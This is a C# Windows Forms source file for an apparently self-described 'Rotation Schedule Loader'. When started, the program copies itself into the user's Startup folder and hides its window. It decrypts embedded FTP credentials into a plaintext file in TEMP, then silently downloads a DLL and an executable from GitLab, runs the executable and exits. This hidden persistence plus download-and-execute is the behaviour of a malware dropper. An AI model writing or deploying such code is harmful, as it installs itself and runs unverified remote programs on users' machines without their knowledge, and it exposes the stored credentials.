using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Rotation_Schedule_Loader.Properties;
using UsefulTools;

namespace Rotation_Schedule_Loader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async Task CheckInternet()
        {
            bool Internet = false;
            string StringDownload = String.Empty;
            while (Internet == false)
            {
                await Task.Factory.StartNew(() =>
                {
                    using (var client = new WebClient())
                    {
                        try
                        {
                            StringDownload = client.DownloadString(new Uri(
                                "http://www.msftncsi.com/ncsi.txt"));
                        }
                        catch
                        {

                        }
                    }
                });


                if (StringDownload == "Microsoft NCSI")
                {
                    Internet = true;
                }

                await Task.Delay(10);
            }

            Internet = false;
        }
        private async void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\RotationSchedule.exe"))
            {
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\RotationSchedule.exe");
            }
            ShowInTaskbar = false;
            Visible = false;
            string ActiveAccount = "";
            await CheckInternet();
            try
            {
                using (var client = new WebClient())
                {
                    File.WriteAllBytes(Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation.txt",Resources.EC);
                    Cipher.FileDecrypt(Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation.txt", Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation_DC.txt","e");
                    string[] Details = File.ReadAllLines(Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation_DC.txt");
                    client.Credentials = new NetworkCredential(Details[0],Details[1]);
                    //ActiveAccount = client.DownloadString("ftp://ftpupload.net/htdocs/GitHub/ActiveAccount.txt");
                }
                using (var client = new WebClient())
                {
                    client.DownloadFile(new Uri("https://gitlab.com/Cntowergun/computer-essentials/-/raw/master/DLL/API's/UsefulTools.dll"), Environment.GetEnvironmentVariable("TEMP") + "\\UsefulTools.dll");
                }
            }
            catch 
            {
                
            }
            using (var client = new WebClient())
            {
                string Bruh = Path.GetTempPath() + "\\Schedule.exe";
                client.DownloadFileAsync(new Uri("https://gitlab.com/Cntowergun/computer-essentials/-/raw/master/Rotation-Schedule/Rotation-Schedule/bin/Debug/Rotation-Schedule.exe"),Bruh);
                while (client.IsBusy)
                {
                    await Task.Delay(10);
                }
                Process.Start(Bruh);
            }
            Application.Exit();
        }
    }
}
